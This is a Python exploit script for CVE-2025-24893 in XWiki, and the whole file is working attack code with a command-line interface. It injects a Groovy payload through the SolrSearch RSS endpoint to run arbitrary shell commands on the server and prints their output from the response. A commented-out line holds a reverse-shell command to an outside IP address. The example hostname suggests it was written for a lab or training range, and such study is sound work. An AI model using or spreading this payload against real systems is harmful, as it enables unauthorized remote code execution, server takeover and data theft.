#!/usr/bin/env python3
import argparse
import requests
import urllib.parse
import html
import xml.etree.ElementTree as ET
import re
import sys

def make_payload(cmd: str) -> str:
    """
    Build the Groovy payload without using f-strings so we avoid brace escaping issues.
    Returns the raw payload (not URL-encoded).
    """
    prefix = '}}}{{async async=false}}{{groovy}}println(Runtime.getRuntime().exec("'
    suffix = '").text){{/groovy}}{{/async}}'
    return prefix + cmd + suffix

def fetch_rss_xml(host: str, cmd: str, timeout: int = 10) -> str:
    payload = make_payload(cmd)
    encoded = urllib.parse.quote(payload, safe='')
    url = f"{host.rstrip('/')}/xwiki/bin/get/Main/SolrSearch?media=rss&text={encoded}"
    # print("[*] Requesting:", url)
    headers = {"User-Agent": "exploit-script/1.0"}
    r = requests.get(url, headers=headers, timeout=timeout)
    r.raise_for_status()
    return r.text

def extract_xml_from_response(resp_text: str) -> str:
    """
    The response often contains an HTML-escaped XML block (e.g. &lt;?xml ... &gt;).
    Find the first occurrence of an XML prolog (escaped or not), unescape HTML entities,
    and return the XML substring starting at <?xml ...>.
    """
    # First try the escaped form (&lt;?xml)
    esc_idx = resp_text.find("&lt;?xml")
    if esc_idx != -1:
        # Unescape from that point forward (to avoid unescaping the whole HTML page)
        tail = resp_text[esc_idx:]
        unescaped = html.unescape(tail)
        # Now look for the <?xml in the unescaped string
        idx = unescaped.find("<?xml")
        if idx != -1:
            return unescaped[idx:]
        # fallback: return whole unescaped chunk
        return unescaped

    # If no escaped XML, try plain XML
    plain_idx = resp_text.find("<?xml")
    if plain_idx != -1:
        return resp_text[plain_idx:]

    raise RuntimeError("No XML prolog found in response")

def parse_rss_and_get_output(xml_str: str) -> str:
    """
    Parse RSS XML and extract output text from <channel>/<title> or <description>.
    Then clean it (remove wrapper text like 'RSS feed for search on [ ... ]').
    """
    #xml_str = xml_str.split('}}}')[1].replace("<br/>", "\n").split("]</title>")[0].replace("<p>", "").replace("</p>", "").strip()
    #return xml_str.replace("<em>", "").replace("</em>", "")
    xml_str = xml_str.split('}}}')[1].split("]</title>")[0].replace("<br/>", "\n")
    #return xml_str.replace("<em>", "").replace("</em>", "").replace("<p>", "").replace("</p>", "").strip()
    return xml_str
 

def run_exploit(host: str, cmd: str, timeout: int = 10) -> str:
    resp = fetch_rss_xml(host, cmd, timeout=timeout)
    xml = extract_xml_from_response(resp)
    out = parse_rss_and_get_output(xml)
    return out

def main():
    ap = argparse.ArgumentParser(description="Exploit CVE-2025-24893 (SolrSearch Groovy injection) and extract command output from RSS.")
    ap.add_argument("--host", required=True, help="Base URL, e.g. http://thevendor.falcon.powergrid.tcc")
    ap.add_argument("--cmd", default="id", help='Command to run on target (default: "id")')
    ap.add_argument("--timeout", type=int, default=100, help="HTTP timeout seconds")
    args = ap.parse_args()

    try:
        #cmd = """sh -i >& /dev/tcp/10.200.0.101/9001 0>&1"""
        cmd = args.cmd
        result = run_exploit(args.host, cmd, timeout=args.timeout)
        if result:
            print(result)
        else:
            print("[!] No output captured", file=sys.stderr)
    except Exception as e:
        print("[!] Error:", str(e), file=sys.stderr)
        sys.exit(2)

if __name__ == "__main__":
    main()